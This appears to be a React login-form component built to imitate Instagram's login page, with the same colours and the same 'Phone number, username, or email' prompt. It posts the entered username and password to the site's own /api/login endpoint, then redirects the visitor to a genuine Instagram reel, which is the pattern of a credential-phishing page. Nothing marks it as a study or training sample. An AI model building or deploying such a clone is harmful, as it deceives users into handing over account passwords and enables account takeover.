"use client"

import React, { useState } from "react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"

export default function LoginForm() {
  const [identifier, setIdentifier] = useState("")
  const [password, setPassword] = useState("")
  const [status, setStatus] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setStatus(null)
    setLoading(true)
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier, password }),
      })

      const data = await res.json()
      if (!res.ok) {
        setStatus(data?.error || "Login failed")
      } else {
        // Redirect to Instagram reel after successful login
        window.location.href = "https://www.instagram.com/reel/DRjOciwja4v/?utm_source=ig_web_button_share_sheet"
      }
    } catch (err) {
      setStatus("Network error")
    } finally {
      setLoading(false)
    }
  }

  return (
    <form className="w-full flex flex-col gap-1.5" onSubmit={handleSubmit}>
      <Input
        type="text"
        placeholder="Phone number, username, or email"
        value={identifier}
        onChange={(e) => setIdentifier(e.target.value)}
        className="bg-[#121212] border-[#363636] text-white placeholder:text-[#737373] text-xs h-9 rounded-sm focus-visible:ring-1 focus-visible:ring-[#363636]"
      />
      <Input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        className="bg-[#121212] border-[#363636] text-white placeholder:text-[#737373] text-xs h-9 rounded-sm focus-visible:ring-1 focus-visible:ring-[#363636]"
      />

      <Button
        type="submit"
        className="w-full mt-2 bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold rounded-lg h-8 text-sm"
        disabled={loading}
      >
        {loading ? "Logging in..." : "Log in"}
      </Button>

      {status && <p className="text-sm text-[#a8a8a8] mt-2">{status}</p>}
    </form>
  )
}
